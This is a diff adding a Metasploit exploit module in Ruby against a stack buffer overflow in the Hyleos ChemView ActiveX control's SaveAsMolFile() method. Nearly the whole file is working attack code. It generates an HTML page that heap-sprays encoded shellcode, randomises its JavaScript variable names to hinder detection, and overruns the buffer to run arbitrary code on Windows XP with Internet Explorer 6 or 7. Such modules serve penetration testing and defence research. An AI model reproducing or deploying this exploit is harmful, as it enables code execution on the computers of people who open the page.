@@ -1,0 +1,106 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Hyleos ChemView ActiveX Control Buffer Overflow Exploit',
+			'Description'    => %q{
+				This module exploits a stack-based buffer overflow within HyleosChemView.ocx of Hyleos ChemView 1.9.5.1
+				By setting an overly long value to 'SaveAsMolFile()', an attacker can overrun a buffer
+				and execute arbitrary code.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Dz_attacker <dz_attacker[at]hotmail.fr>'
+				],
+			'References'     =>
+				[
+					[ 'URL', 'http://www.security-assessment.com/files/advisories/2010-02-11_ChemviewX_Activex.pdf' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Payload'        =>
+				{
+					'Space'         => 1024,
+					'BadChars'      => "\x00\x0a\x0a\x20",
+					'StackAdjustment' => -3500,
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0A0A0a0A, 'Offset' => 150 } ]
+				],
+			'DisclosureDate' => 'Feb 11 2010',
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('FILENAME',   [ false, 'The file name.',  'msf.html']),
+				], self.class)
+	end
+
+	def exploit
+
+		# Encode the shellcode
+		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
+
+		# Setup exploit buffers
+		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
+		ret  	  = Rex::Text.uri_encode([target.ret].pack('L'))
+		blocksize = 0x40000
+		fillto    = 300
+		offset 	  = target['Offset']
+
+		# Randomize the javascript variable names
+		chemview     = rand_text_alpha(rand(100) + 1)
+		j_shellcode  = rand_text_alpha(rand(100) + 1)
+		j_nops       = rand_text_alpha(rand(100) + 1)
+		j_ret        = rand_text_alpha(rand(100) + 1)
+		j_headersize = rand_text_alpha(rand(100) + 1)
+		j_slackspace = rand_text_alpha(rand(100) + 1)
+		j_fillblock  = rand_text_alpha(rand(100) + 1)
+		j_block      = rand_text_alpha(rand(100) + 1)
+		j_memory     = rand_text_alpha(rand(100) + 1)
+		j_counter    = rand_text_alpha(rand(30) + 2)
+
+
+		html = %Q|<html>
+<object classid='clsid:C372350A-1D5A-44DC-A759-767FC553D96C' id='#{chemview}'></object>
+<script>
+#{j_shellcode}=unescape('#{shellcode}');
+#{j_nops}=unescape('#{nops}');
+#{j_headersize}=20;
+#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
+while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
+#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
+#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
+while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
+#{j_memory}=new Array();
+for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};
+
+var #{j_ret}='';
+for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');
+#{chemview}.SaveAsMolFile(#{j_ret});
+</script>
+</html>|
+
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
+
+		file_create(html)
+	end
+
+end
